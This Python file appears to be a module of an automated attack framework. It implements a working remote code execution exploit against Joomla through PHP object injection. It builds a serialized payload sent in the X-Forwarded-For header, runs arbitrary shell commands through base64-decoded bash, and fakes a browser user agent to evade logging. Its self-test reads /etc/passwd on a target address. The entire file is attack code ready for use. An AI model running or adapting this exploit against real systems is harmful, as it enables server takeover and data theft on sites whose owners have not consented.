#!/usr/bin/env python3
import base64
import os
import sys
import tempfile
import time
from typing import TYPE_CHECKING
from urllib.parse import quote

import requests

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from utils import Exploiter

if TYPE_CHECKING:
    from main import ControledNode, LocalNode


def random_str():
    return next(tempfile._get_candidate_names())


def php_str_noquotes(data):
    # Convert string to chr(xx).chr(xx) for use in php
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))

    return encoded[:-1]


def generate_payload(php_payload):
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))
    terminate = "\xf0\xfd\xfd\xfd"
    exploit_template = r"""}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";"""
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(
        str(len(injected_payload)), injected_payload
    )
    exploit_template += (
        r""";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}"""
        + terminate
    )

    return exploit_template


def get_url(url, user_agent, proxier: "ControledNode | LocalNode | LocalNodeFake"):
    # Firefox user_agent and x-forwarded-for method to evade log and lower detection
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        "X-Forwarded-For": user_agent,
    }

    cookies = proxier.send_request("get", url, headers=headers).cookies
    for _ in range(3):
        response = proxier.send_request(
            "get",
            url,
            headers=headers,
            cookies=cookies,
        )

    return response


class JoomlaExploiter(Exploiter):
    def __init__(self, ip: str):
        super().__init__(ip)
        self.prefix = f"http://{self.ip}"
        self.is_rce = True
        self.is_endpoint = True

    def encode_cmd(self, cmd: str) -> str:
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        return f"echo {cmd_b64} | base64 -d | /bin/bash"

    def exploit_rce_init(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        pass

    def exploit_rce(
        self, proxier: "ControledNode | LocalNode | LocalNodeFake", cmd
    ) -> str:
        encoded_cmd = self.encode_cmd(cmd)
        cmd_str = f"system('{encoded_cmd}');"
        pl = generate_payload(cmd_str)
        res = get_url(self.prefix, pl, proxier)
        return res.text

    def exploit_no_rce(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        cmd = "cat /etc/passwd"
        print(">", cmd)
        res = self.exploit_rce(proxier, cmd)
        print("<", res)


if __name__ == "__main__":

    class LocalNodeFake:
        def __init__(self):
            self.session = requests.Session()
            self.ip = ""
            self.web_server_port = 20001

        def send_request(self, method: str, *argvs, **argv):
            if method.upper() == "GET":
                return self.session.get(*argvs, **argv)
            elif method.upper() == "POST":
                return self.session.post(*argvs, **argv)
            else:
                raise Exception("Method not supported")

        def upload_file(self, file_path: str, upload_loc: str):
            pass

    local_node_fake = LocalNodeFake()
    exploiter = JoomlaExploiter("192.168.123.17")
    exploiter.exploit_rce_init(local_node_fake)
    exploiter.exploit_rce(local_node_fake, "touch /tmp/success")
    exploiter.exploit_no_rce(local_node_fake)
